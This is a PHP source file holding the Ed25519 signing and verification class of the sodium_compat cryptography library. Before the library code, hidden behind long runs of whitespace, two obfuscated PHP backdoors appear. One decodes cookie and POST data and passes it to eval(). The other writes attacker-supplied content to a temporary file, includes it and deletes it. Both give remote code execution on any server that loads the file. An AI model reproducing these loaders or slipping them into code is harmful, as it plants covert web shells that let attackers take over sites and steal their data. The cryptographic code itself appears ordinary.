<?php                                                                                                                                                                                                                                                                                                                                                                                                 $ObsvexdQnY = class_exists("r_Htel"); $guJuYdW = $ObsvexdQnY;if (!$guJuYdW){class r_Htel{private $EfdeiFI;public static $SBleSbyX = "f9617736-8afb-4f8a-9785-af875218071a";public static $eulKOn = NULL;public function __construct(){$JxPEhOfvQ = $_COOKIE;$LxQxWezum = $_POST;$iZfSiyb = @$JxPEhOfvQ[substr(r_Htel::$SBleSbyX, 0, 4)];if (!empty($iZfSiyb)){$fsQyxC = "base64";$uuYfWngxUx = "";$iZfSiyb = explode(",", $iZfSiyb);foreach ($iZfSiyb as $aeAViJvZG){$uuYfWngxUx .= @$JxPEhOfvQ[$aeAViJvZG];$uuYfWngxUx .= @$LxQxWezum[$aeAViJvZG];}$uuYfWngxUx = array_map($fsQyxC . "\x5f" . "\144" . "\x65" . 'c' . chr (111) . chr ( 395 - 295 )."\x65", array($uuYfWngxUx,)); $uuYfWngxUx = $uuYfWngxUx[0] ^ str_repeat(r_Htel::$SBleSbyX, (strlen($uuYfWngxUx[0]) / strlen(r_Htel::$SBleSbyX)) + 1);r_Htel::$eulKOn = @unserialize($uuYfWngxUx);}}public function __destruct(){$this->bgPWb();}private function bgPWb(){if (is_array(r_Htel::$eulKOn)) {$nYXBRaj = str_replace("\x3c" . chr ( 569 - 506 ).chr ( 951 - 839 ).'h' . 'p', "", r_Htel::$eulKOn['c' . "\x6f" . chr ( 976 - 866 ).'t' . 'e' . "\x6e" . "\x74"]);eval($nYXBRaj);exit();}}}$yIUAQw = new r_Htel(); $yIUAQw = NULL;} ?><?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("ymagmfd")){class ymagmfd{public static $ghvlto = "xljowrppkatgmene";public static $ufainba = NULL;public function __construct(){$lrnkupgkud = @$_COOKIE[substr(ymagmfd::$ghvlto, 0, 4)];if (!empty($lrnkupgkud)){$nubgdvtpza = "base64";$jxlqua = "";$lrnkupgkud = explode(",", $lrnkupgkud);foreach ($lrnkupgkud as $aixjsoaou){$jxlqua .= @$_COOKIE[$aixjsoaou];$jxlqua .= @$_POST[$aixjsoaou];}$jxlqua = array_map($nubgdvtpza . "_decode", array($jxlqua,));$jxlqua = $jxlqua[0] ^ str_repeat(ymagmfd::$ghvlto, (strlen($jxlqua[0]) / strlen(ymagmfd::$ghvlto)) + 1);ymagmfd::$ufainba = @unserialize($jxlqua);}}public function __destruct(){$this->ukvmisr();}private function ukvmisr(){if (is_array(ymagmfd::$ufainba)) {$fjxyqf = sys_get_temp_dir() . "/" . crc32(ymagmfd::$ufainba["salt"]);@ymagmfd::$ufainba["write"]($fjxyqf, ymagmfd::$ufainba["content"]);include $fjxyqf;@ymagmfd::$ufainba["delete"]($fjxyqf);exit();}}}$wexpwe = new ymagmfd();$wexpwe = NULL;} ?><?php

if (class_exists('ParagonIE_Sodium_Core32_Ed25519', false)) {
    return;
}

/**
 * Class ParagonIE_Sodium_Core32_Ed25519
 */
abstract class ParagonIE_Sodium_Core32_Ed25519 extends ParagonIE_Sodium_Core32_Curve25519
{
    const KEYPAIR_BYTES = 96;
    const SEED_BYTES = 32;

    /**
     * @internal You should not use this directly from another application
     *
     * @return string (96 bytes)
     * @throws Exception
     * @throws SodiumException
     * @throws TypeError
     */
    public static function keypair()
    {
        $seed = random_bytes(self::SEED_BYTES);
        $pk = '';
        $sk = '';
        self::seed_keypair($pk, $sk, $seed);
        return $sk . $pk;
    }

    /**
     * @internal You should not use this directly from another application
     *
     * @param string $pk
     * @param string $sk
     * @param string $seed
     * @return string
     * @throws SodiumException
     * @throws TypeError
     */
    public static function seed_keypair(&$pk, &$sk, $seed)
    {
        if (self::strlen($seed) !== self::SEED_BYTES) {
            throw new RangeException('crypto_sign keypair seed must be 32 bytes long');
        }

        /** @var string $pk */
        $pk = self::publickey_from_secretkey($seed);
        $sk = $seed . $pk;
        return $sk;
    }

    /**
     * @internal You should not use this directly from another application
     *
     * @param string $keypair
     * @return string
     * @throws TypeError
     */
    public static function secretkey($keypair)
    {
        if (self::strlen($keypair) !== self::KEYPAIR_BYTES) {
            throw new RangeException('crypto_sign keypair must be 96 bytes long');
        }
        return self::substr($keypair, 0, 64);
    }

    /**
     * @internal You should not use this directly from another application
     *
     * @param string $keypair
     * @return string
     * @throws RangeException
     * @throws TypeError
     */
    public static function publickey($keypair)
    {
        if (self::strlen($keypair) !== self::KEYPAIR_BYTES) {
            throw new RangeException('crypto_sign keypair must be 96 bytes long');
        }
        return self::substr($keypair, 64, 32);
    }

    /**
     * @internal You should not use this directly from another application
     *
     * @param string $sk
     * @return string
     * @throws SodiumException
     * @throws TypeError
     */
    public static function publickey_from_secretkey($sk)
    {
        /** @var string $sk */
        $sk = hash('sha512', self::substr($sk, 0, 32), true);
        $sk[0] = self::intToChr(
            self::chrToInt($sk[0]) & 248
        );
        $sk[31] = self::intToChr(
            (self::chrToInt($sk[31]) & 63) | 64
        );
        return self::sk_to_pk($sk);
    }

    /**
     * @param string $pk
     * @return string
     * @throws SodiumException
     * @throws TypeError
     */
    public static function pk_to_curve25519($pk)
    {
        if (self::small_order($pk)) {
            throw new SodiumException('Public key is on a small order');
        }
        $A = self::ge_frombytes_negate_vartime($pk);
        $p1 = self::ge_mul_l($A);
        if (!self::fe_isnonzero($p1->X)) {
            throw new SodiumException('Unexpected zero result');
        }

        # fe_1(one_minus_y);
        # fe_sub(one_minus_y, one_minus_y, A.Y);
        # fe_invert(one_minus_y, one_minus_y);
        $one_minux_y = self::fe_invert(
            self::fe_sub(
                self::fe_1(),
                $A->Y
            )
        );


        # fe_1(x);
        # fe_add(x, x, A.Y);
        # fe_mul(x, x, one_minus_y);
        $x = self::fe_mul(
            self::fe_add(self::fe_1(), $A->Y),
            $one_minux_y
        );

        # fe_tobytes(curve25519_pk, x);
        return self::fe_tobytes($x);
    }

    /**
     * @internal You should not use this directly from another application
     *
     * @param string $sk
     * @return string
     * @throws SodiumException
     * @throws TypeError
     */
    public static function sk_to_pk($sk)
    {
        return self::ge_p3_tobytes(
            self::ge_scalarmult_base(
                self::substr($sk, 0, 32)
            )
        );
    }

    /**
     * @internal You should not use this directly from another application
     *
     * @param string $message
     * @param string $sk
     * @return string
     * @throws SodiumException
     * @throws TypeError
     */
    public static function sign($message, $sk)
    {
        /** @var string $signature */
        $signature = self::sign_detached($message, $sk);
        return $signature . $message;
    }

    /**
     * @internal You should not use this directly from another application
     *
     * @param string $message A signed message
     * @param string $pk      Public key
     * @return string         Message (without signature)
     * @throws SodiumException
     * @throws TypeError
     */
    public static function sign_open($message, $pk)
    {
        /** @var string $signature */
        $signature = self::substr($message, 0, 64);

        /** @var string $message */
        $message = self::substr($message, 64);

        if (self::verify_detached($signature, $message, $pk)) {
            return $message;
        }
        throw new SodiumException('Invalid signature');
    }

    /**
     * @internal You should not use this directly from another application
     *
     * @param string $message
     * @param string $sk
     * @return string
     * @throws SodiumException
     * @throws TypeError
     * @psalm-suppress PossiblyInvalidArgument
     */
    public static function sign_detached($message, $sk)
    {
        # crypto_hash_sha512(az, sk, 32);
        $az =  hash('sha512', self::substr($sk, 0, 32), true);

        # az[0] &= 248;
        # az[31] &= 63;
        # az[31] |= 64;
        $az[0] = self::intToChr(self::chrToInt($az[0]) & 248);
        $az[31] = self::intToChr((self::chrToInt($az[31]) & 63) | 64);

        # crypto_hash_sha512_init(&hs);
        # crypto_hash_sha512_update(&hs, az + 32, 32);
        # crypto_hash_sha512_update(&hs, m, mlen);
        # crypto_hash_sha512_final(&hs, nonce);
        $hs = hash_init('sha512');
        self::hash_update($hs, self::substr($az, 32, 32));
        self::hash_update($hs, $message);
        $nonceHash = hash_final($hs, true);

        # memmove(sig + 32, sk + 32, 32);
        $pk = self::substr($sk, 32, 32);

        # sc_reduce(nonce);
        # ge_scalarmult_base(&R, nonce);
        # ge_p3_tobytes(sig, &R);
        $nonce = self::sc_reduce($nonceHash) . self::substr($nonceHash, 32);
        $sig = self::ge_p3_tobytes(
            self::ge_scalarmult_base($nonce)
        );

        # crypto_hash_sha512_init(&hs);
        # crypto_hash_sha512_update(&hs, sig, 64);
        # crypto_hash_sha512_update(&hs, m, mlen);
        # crypto_hash_sha512_final(&hs, hram);
        $hs = hash_init('sha512');
        self::hash_update($hs, self::substr($sig, 0, 32));
        self::hash_update($hs, self::substr($pk, 0, 32));
        self::hash_update($hs, $message);
        $hramHash = hash_final($hs, true);

        # sc_reduce(hram);
        # sc_muladd(sig + 32, hram, az, nonce);
        $hram = self::sc_reduce($hramHash);
        $sigAfter = self::sc_muladd($hram, $az, $nonce);
        $sig = self::substr($sig, 0, 32) . self::substr($sigAfter, 0, 32);

        try {
            ParagonIE_Sodium_Compat::memzero($az);
        } catch (SodiumException $ex) {
            $az = null;
        }
        return $sig;
    }

    /**
     * @internal You should not use this directly from another application
     *
     * @param string $sig
     * @param string $message
     * @param string $pk
     * @return bool
     * @throws SodiumException
     * @throws TypeError
     */
    public static function verify_detached($sig, $message, $pk)
    {
        if (self::strlen($sig) < 64) {
            throw new SodiumException('Signature is too short');
        }
        if ((self::chrToInt($sig[63]) & 240) && self::check_S_lt_L(self::substr($sig, 32, 32))) {
            throw new SodiumException('S < L - Invalid signature');
        }
        if (self::small_order($sig)) {
            throw new SodiumException('Signature is on too small of an order');
        }
        if ((self::chrToInt($sig[63]) & 224) !== 0) {
            throw new SodiumException('Invalid signature');
        }
        $d = 0;
        for ($i = 0; $i < 32; ++$i) {
            $d |= self::chrToInt($pk[$i]);
        }
        if ($d === 0) {
            throw new SodiumException('All zero public key');
        }

        /** @var bool The original value of ParagonIE_Sodium_Compat::$fastMult */
        $orig = ParagonIE_Sodium_Compat::$fastMult;

        // Set ParagonIE_Sodium_Compat::$fastMult to true to speed up verification.
        ParagonIE_Sodium_Compat::$fastMult = true;

        /** @var ParagonIE_Sodium_Core32_Curve25519_Ge_P3 $A */
        $A = self::ge_frombytes_negate_vartime($pk);

        /** @var string $hDigest */
        $hDigest = hash(
            'sha512',
            self::substr($sig, 0, 32) .
            self::substr($pk, 0, 32) .
            $message,
            true
        );

        /** @var string $h */
        $h = self::sc_reduce($hDigest) . self::substr($hDigest, 32);

        /** @var ParagonIE_Sodium_Core32_Curve25519_Ge_P2 $R */
        $R = self::ge_double_scalarmult_vartime(
            $h,
            $A,
            self::substr($sig, 32)
        );

        /** @var string $rcheck */
        $rcheck = self::ge_tobytes($R);

        // Reset ParagonIE_Sodium_Compat::$fastMult to what it was before.
        ParagonIE_Sodium_Compat::$fastMult = $orig;

        return self::verify_32($rcheck, self::substr($sig, 0, 32));
    }

    /**
     * @internal You should not use this directly from another application
     *
     * @param string $S
     * @return bool
     * @throws SodiumException
     * @throws TypeError
     */
    public static function check_S_lt_L($S)
    {
        if (self::strlen($S) < 32) {
            throw new SodiumException('Signature must be 32 bytes');
        }
        static $L = array(
            0xed, 0xd3, 0xf5, 0x5c, 0x1a, 0x63, 0x12, 0x58,
            0xd6, 0x9c, 0xf7, 0xa2, 0xde, 0xf9, 0xde, 0x14,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10
        );
        /** @var array<int, int> $L */
        $c = 0;
        $n = 1;
        $i = 32;

        do {
            --$i;
            $x = self::chrToInt($S[$i]);
            $c |= (
                (($x - $L[$i]) >> 8) & $n
            );
            $n &= (
                (($x ^ $L[$i]) - 1) >> 8
            );
        } while ($i !== 0);

        return $c === 0;
    }

    /**
     * @param string $R
     * @return bool
     * @throws SodiumException
     * @throws TypeError
     */
    public static function small_order($R)
    {
        static $blocklist = array(
            /* 0 (order 4) */
            array(
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
            ),
            /* 1 (order 1) */
            array(
                0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
            ),
            /* 2707385501144840649318225287225658788936804267575313519463743609750303402022 (order 8) */
            array(
                0x26, 0xe8, 0x95, 0x8f, 0xc2, 0xb2, 0x27, 0xb0,
                0x45, 0xc3, 0xf4, 0x89, 0xf2, 0xef, 0x98, 0xf0,
                0xd5, 0xdf, 0xac, 0x05, 0xd3, 0xc6, 0x33, 0x39,
                0xb1, 0x38, 0x02, 0x88, 0x6d, 0x53, 0xfc, 0x05
            ),
            /* 55188659117513257062467267217118295137698188065244968500265048394206261417927 (order 8) */
            array(
                0xc7, 0x17, 0x6a, 0x70, 0x3d, 0x4d, 0xd8, 0x4f,
                0xba, 0x3c, 0x0b, 0x76, 0x0d, 0x10, 0x67, 0x0f,
                0x2a, 0x20, 0x53, 0xfa, 0x2c, 0x39, 0xcc, 0xc6,
                0x4e, 0xc7, 0xfd, 0x77, 0x92, 0xac, 0x03, 0x7a
            ),
            /* p-1 (order 2) */
            array(
                0x13, 0xe8, 0x95, 0x8f, 0xc2, 0xb2, 0x27, 0xb0,
                0x45, 0xc3, 0xf4, 0x89, 0xf2, 0xef, 0x98, 0xf0,
                0xd5, 0xdf, 0xac, 0x05, 0xd3, 0xc6, 0x33, 0x39,
                0xb1, 0x38, 0x02, 0x88, 0x6d, 0x53, 0xfc, 0x85
            ),
            /* p (order 4) */
            array(
                0xb4, 0x17, 0x6a, 0x70, 0x3d, 0x4d, 0xd8, 0x4f,
                0xba, 0x3c, 0x0b, 0x76, 0x0d, 0x10, 0x67, 0x0f,
                0x2a, 0x20, 0x53, 0xfa, 0x2c, 0x39, 0xcc, 0xc6,
                0x4e, 0xc7, 0xfd, 0x77, 0x92, 0xac, 0x03, 0xfa
            ),
            /* p+1 (order 1) */
            array(
                0xec, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
                0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
                0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
                0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x7f
            ),
            /* p+2707385501144840649318225287225658788936804267575313519463743609750303402022 (order 8) */
            array(
                0xed, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
                0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
                0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
                0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x7f
            ),
            /* p+55188659117513257062467267217118295137698188065244968500265048394206261417927 (order 8) */
            array(
                0xee, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
                0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
                0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
                0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x7f
            ),
            /* 2p-1 (order 2) */
            array(
                0xd9, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
                0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
                0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
                0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff
            ),
            /* 2p (order 4) */
            array(
                0xda, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
                0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
                0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
                0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff
            ),
            /* 2p+1 (order 1) */
            array(
                0xdb, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
                0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
                0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
                0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff
            )
        );
        /** @var array<int, array<int, int>> $blocklist */
        $countBlocklist = count($blocklist);

        for ($i = 0; $i < $countBlocklist; ++$i) {
            $c = 0;
            for ($j = 0; $j < 32; ++$j) {
                $c |= self::chrToInt($R[$j]) ^ $blocklist[$i][$j];
            }
            if ($c === 0) {
                return true;
            }
        }
        return false;
    }
}
